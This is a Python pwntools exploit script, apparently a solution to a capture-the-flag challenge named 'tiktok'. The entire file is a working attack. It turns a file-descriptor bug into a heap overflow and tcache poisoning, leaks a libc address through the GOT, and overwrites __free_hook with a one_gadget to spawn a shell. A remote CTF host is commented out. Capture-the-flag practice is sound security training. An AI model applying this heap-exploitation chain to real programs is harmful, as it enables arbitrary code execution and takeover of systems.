from pwn import *
import struct

#Song size:
"""
<directory>: 1 bytes

Animal/animal.txt: 946 bytes
Rainbow/godzilla.txt: 767 bytes
Warrior/pastlive.txt: 829 bytes
"""

context.binary = "./tiktok"
context.terminal = "/bin/bash"

#sh = remote('ctf.umbccd.io', 4700)
sh = process('./tiktok')

@atexception.register
def handler():
	log.failure(sh.recvall())

def imp(path):
	sh.sendlineafter("Choice: ","1")
	sh.sendline(path)
	sh.recvuntil("like to do today?")

def list(amount, tag):
	sh.sendline("2")
	sh.recvuntil(tag)
	return sh.recv(amount)

def play(id, tag="", amount=0):
	sh.sendlineafter("Choice: ", "3")
	sh.sendline(id)
	sh.recvuntil(tag)
	s = sh.recv(amount)
	sh.recvuntil("like to do today?")
	return s

def play_overflow(id, length, content): #Use this if the song you're going to play has its file descriptor overwritten by stdin
	sh.sendlineafter("Choice: ", "3")
	sh.sendline(id)
	sh.sendline(length)
	if len(content) > 0x450: #Check needed due to weird read() buffering over a network.
		print "Error your payload's too long. It is " + str(len(content)) + " bytes."
		exit()
	sh.sendline(content)
	sh.recvuntil("like to do today?")

def delete(id, getsh=0):
	sh.sendlineafter("Choice: ","4")
	sh.sendline(id)
	if getsh == 0:
		sh.recvuntil("like to do today?")

for i in range(0, 11): #ids 1-11 are rainbow-godzilla (767 bytes)
        imp("Rainbow/godzilla.txt")

for i in range(0, 11): #ids 12-22 is a directory (1 bytes)
        imp("Warrior")

for i in range(0, 11): #ids 23-33 is animal-animal (946 bytes)
        imp("Animal/animal.txt")

for i in range(0, 10): #ids 34-43 is Warrior-pastlive (829 bytes)
        imp("Warrior/pastlive.txt")
        
badfile = "Warrior" + "/"*(0x18-len("Warrior"))
imp(badfile) #Number 44 now has stdin as file descriptor

play("12")
play("13")
play("2") #Reserving song #1 for later use


imp("Warrior") #These will be used in the final tcache poison
imp("Warrior")
play("45")
play("46")

play("23")

delete("13")
delete("12")
delete("2")
delete("23")

bss_segment = p64(0x404078) #Song num 1's fd
bss_segment_2 = p64(0x404120) #Song num 4's fd (cuz song 2 and eventually 3 is now gone :()
payload = "A"*32
payload += bss_segment
payload += "B"*(32-8)
payload += bss_segment_2
payload += "C"*760


payload += p64(0) + p64(0x3c1) #Song num 45 is now in a 0x3c0 byte chunk
payload += "\x00"*(880 - 848 - 8)
payload += p64(0x3c1) #Song num 46 is now in an 0x3c0 byte chunk
payload += "\x00"*48
play_overflow("44", "-1", payload)

delete("46")
delete("45")

play("14")
play("15") #Song no 1 now has fd 0

play("3")

atoi_got = p64(0x403fd0)
clobber = p64(0x0) #Set song 4's filedesc to 0
#Gonna clobber the .bss with an allocation. First need to generate the payload
for i in range(0, 13):
        clobber += atoi_got
        clobber += atoi_got
        clobber += "\x00"*(5*8)
        
#Fix up the end to not corrupt any pointers
clobber += atoi_got
clobber += atoi_got
clobber += "\x00"*(31-16)
play_overflow("1", "767", clobber) #Song num 4-17's song->filedesc is set to 0, and their song author pointer points to atoi, which has atoi libc address

atoi_libc = u64(list(6, "15. ").ljust(8, '\x00'))
log.success("Atoi in libc: " + hex(atoi_libc))

atoi_offset = 0x40680
onegad_offset = 0x4f322
free_hook_offset = 0x3ed8e8

libc_base = atoi_libc - atoi_offset
free_hook_libc = libc_base + free_hook_offset
one_gadget_libc = libc_base + onegad_offset

log.success("libc base: " + hex(libc_base))
log.success("Free hook location: " + hex(free_hook_libc))
log.success("One gadget location: " + hex(one_gadget_libc))

play_overflow("4", "946", "A"*32 + p64(free_hook_libc))
play_overflow("5", "946", "omgplswork")
play_overflow("6", "946", p64(one_gadget_libc) + "\x00"*100)
delete("4", 1)
sh.recvuntil("Removing: ") #Just to make output nicer
sh.interactive()
